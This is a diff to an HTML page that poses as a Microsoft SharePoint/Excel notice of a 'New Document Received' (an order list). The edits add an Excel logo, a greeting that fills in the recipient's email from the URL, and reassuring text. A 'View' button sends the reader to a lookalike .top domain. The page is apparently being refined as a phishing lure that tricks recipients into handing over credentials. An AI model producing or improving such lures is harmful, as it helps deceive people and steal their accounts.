@@ -18,13 +18,21 @@
         }
 
         .header img {
-            width: 150px; /* Adjust the logo size */
+            width: 50px; /* Adjust the logo size */
             height: auto;
+            vertical-align: middle;
+        }
+
+        .logo-text {
+            font-size: 24px;
+            margin-left: 10px;
+            font-weight: bold;
         }
 
         h1 {
             color: #333;
             font-size: 24px;
+            font-weight: bold;
         }
 
         p {
@@ -49,19 +57,49 @@
         .button:hover {
             background-color: #005a8b; /* Darker blue */
         }
+
+        .email-address {
+            font-weight: bold;
+            color: #0078d4;
+        }
+
     </style>
 </head>
 <body>
 
     <!-- SharePoint Logo as Header -->
     <div class="header">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/4/47/SharePoint_Logo_2020.svg" alt="SharePoint Logo">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Microsoft_Excel_logo_2021.svg" alt="Excel Logo">
+        <span class="logo-text">Order List</span>
     </div>
 
     <!-- Main Content -->
     <h1>New Document Received</h1>
-    <p>Hello, you have a new document (order list).</p>
+
+    <p>Hello, <span id="user-email" class="email-address">[email]</span></p>
+
+    <p>You have received a new document (Order list) from one of your contacts.</p>
+
     <a href="https://ke-lington-group.top/order-list" class="button" target="_blank">View</a>
+
+    <p>This link will redirect you to view the document securely.</p>
+
+    <!-- JavaScript to dynamically show the user's email -->
+    <script>
+        // Function to get the 'email' query parameter from the URL
+        function getEmailFromURL() {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get('email'); // Get 'email' parameter
+        }
+
+        // Set the email in the span
+        const email = getEmailFromURL();
+        if (email) {
+            document.getElementById('user-email').textContent = email;
+        } else {
+            document.getElementById('user-email').textContent = "Recipient Email Not Provided";
+        }
+    </script>
 
 </body>
 </html>
